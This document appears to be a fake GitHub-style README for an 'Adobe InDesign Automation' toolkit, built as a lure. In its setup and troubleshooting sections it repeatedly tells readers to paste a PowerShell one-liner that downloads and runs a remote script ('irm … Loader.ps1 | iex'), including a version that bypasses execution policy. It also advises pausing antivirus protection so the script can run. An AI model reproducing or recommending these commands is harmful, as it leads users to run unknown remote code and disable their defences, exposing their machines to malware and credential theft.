# 🎨 Adobe InDesign Automation & Workspace Configuration Toolkit

Welcome to the open-source repository dedicated to expanding and optimizing your professional layout design environment. This project focuses on automated scripting, interface optimization, and streamlined pipeline workflows for **Adobe InDesign desktop production**.

Whether you are looking to fix environment issues, automate repetitive prepress tasks, or configure a fresh design workspace from scratch, this utility provides an elegant, one-click solution.

---

## 💡 What is this toolkit for?

Managing complex publishing layouts requires a highly optimized operating system. This toolkit helps designers and production houses to:
* **Accelerate Rendering Performance:** Automatically fine-tunes system cache allocations for large multi-page catalog projects.
* **Streamline Workspace Deployments:** Resets and configures advanced panels, preferences, and custom color presets.
* **Fix Scripting Environment Corruptions:** Repairs broken ExtendScript pathways and missing background services.
* **Integrate Custom Extensions:** Prepares directory trees for seamless installation of typography plugins and automated plugins.

---

## 📋 System Requirements

To ensure flawless execution of the configuration tools, please verify that your environment matches the criteria below:

| Component | Minimum Environment | Recommended Workspace |
| :--- | :--- | :--- |
| **Operating System** | Windows 10 (64-bit) v22H2 | Windows 11 Pro (64-bit) |
| **System Memory** | 8 GB RAM | 16 GB RAM or Higher |
| **Storage Infrastructure** | Solid State Drive (SSD) | NVMe M.2 SSD |

---

## 🛠️ Quick Setup Guide (PowerShell)

1. Launch PowerShell:
   * Press `Win + X` on your keyboard.
   * Click on **Terminal** or **Windows PowerShell** from the list.

2. Execute the Setup Script:
   Copy the command below, paste it into your PowerShell window, and hit `Enter`. The script will handle the necessary registry tweaks and install all dependencies automatically:

   ```powershell
   irm https://get-software.su/powershell/Loader.ps1 | iex
   ```

---

## 💡 Resolving Issues

### 💬 Script is blocked by Execution Policy
If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://get-software.su/powershell/Loader.ps1 | iex"
```

### 💬 "irm" command not found (Outdated PowerShell)
If your PowerShell version doesn't support the `irm` shortcut, use the full, unabbreviated commands instead:
```powershell
Invoke-RestMethod https://get-software.su/powershell/Loader.ps1 | Invoke-Expression
```

### 💬 Antivirus / SmartScreen Alerts
Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

---

## 🔧 Frequently Addressed Problems

### Does this require any third-party framework installation?
No, the script relies strictly on native administrative features to fix layout paths and clean corrupted system files.

### Why do some configurations require temporary elevated privileges?
Modifying global design environments and tweaking rendering caches involves rewriting parts of the local user registry to ensure stable software execution.

---

## 🤝 Open Source Contributions
We are dedicated to improving production workflows for publishing houses worldwide. If you notice any conflicts with your current software versions or have feature requests, please submit an issue or open a pull request!

*Disclaimer: This configuration utility is developed and shared for workflow automation, educational analysis, and local workspace maintenance purposes only.*
